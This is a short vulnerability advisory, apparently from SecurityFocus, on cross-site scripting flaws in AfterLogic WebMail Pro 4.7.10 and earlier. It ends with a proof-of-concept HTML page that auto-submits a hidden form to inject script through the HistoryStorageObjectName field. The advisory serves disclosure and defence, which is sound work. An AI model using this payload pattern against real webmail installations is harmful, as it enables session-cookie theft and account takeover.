@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/36605/info
+
+AfterLogic WebMail Pro is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials; other attacks are also possible.
+
+AfterLogic WebMail Pro 4.7.10 and prior versions are affected. 
+
+<html> <head> </head> <body onLoad="document.form1.submit()"> <form name="form1" method="post" action="http://www.example.com/history-storage.aspx?param=0.21188772204998574" onSubmit="return false;"> <input type="hidden" name="HistoryKey" value="value"/> <input type="hidden" name="HistoryStorageObjectName" value="location; alert('xss'); //"/> </form> </body> </html> 
